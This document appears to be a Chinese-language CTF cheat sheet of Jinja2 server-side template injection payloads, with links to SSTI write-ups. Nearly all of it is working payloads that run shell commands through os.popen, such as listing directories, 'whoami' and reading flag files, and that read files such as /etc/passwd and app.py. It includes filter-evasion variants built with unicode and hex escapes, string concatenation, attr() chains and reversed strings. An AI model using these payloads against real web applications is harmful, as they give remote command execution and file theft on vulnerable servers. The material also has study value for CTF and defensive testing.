# 文章
[SSTI](https://lazzzaro.github.io/2020/05/15/web-SSTI/)<br />[SecMap - SSTI（jinja2）](https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/#%E8%BF%87%E6%BB%A4-.)<br />[ctfshow SSTI 知识点总结_绮洛Ki1ro的博客-CSDN博客](https://blog.csdn.net/m0_62594265/article/details/126226921?spm=1001.2014.3001.5502)
# 执行命令
### unicode + 全部方括号[]
```python
{{()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[80]["\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065"]("os")["popen"]("ls /")|attr("read")()}}
{{()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[80]["\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065"]("\u006f\u0073")["\u0070\u006f\u0070\u0065\u006e"]("ls /")|attr("\u0072\u0065\u0061\u0064")()}}
# 用<class '_frozen_importlib.BuiltinImporter'>这个去执行命令

"""
{{()["__class__"]["__bases__"][0]["__subclasses__"]()[80]["load_module"]("os")["system"]("ls")}}
# 用<class '_frozen_importlib.BuiltinImporter'>这个去执行命令
"""
```
```python
{{()["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f"][0]["\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f"]()[91]["\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061"](0, "app.py")}}

"""
{{()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0, "app.py")}}
# 用<class '_frozen_importlib_external.FileLoader'>这个去读取文件
"""
```
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /data/flag.txt')|attr('read')()}}
```
```python
{{config.__class__.__init__.__globals__['os'].popen('cat /data/flag.txt').read()}}
```
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('find / -name "flag" 2>/dev/null').read() }}
```
```python
{% for c in [].class.base.subclasses() %}
{% if c.name == 'catch_warnings' %}
{% for b in c.init.globals.values() %}
{% if b.class == {}.class %}
{% if 'eval' in b.keys() %}
{{ b['eval']('import("os").popen("cat /data/flag.txt").read()') }}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
```
```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eva'+'l' in b.keys() %}
      {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
### 16进制
```python
{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read() }} 
```
### 字符串拼接
```python
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
```
```python
# [59] 不含os模块的类warnings.catch_warnings
# 绕过__globals__过滤
{{[].__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__(%27os%27).popen(%27cat /flasklight/coomme_geeeett_youur_flek%27).read()")}}
```
```python
# [71]内含os模块的类 class'site._Printer'
# 绕过__globals__过滤
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```
```python
{{config.__init__['__global'+'s__'].os.popen("whoami").read()}}
```
### 一些其他的利用链
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
# 读文件
```python
{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()}}
```
```python
{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='catch_warnings' %}
		{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}
	{% endif %}
{% endfor %}
```
### 使用切片
```python
{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='catch_warnings' %}
		{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}
	{% endif %}
{% endfor %}
```
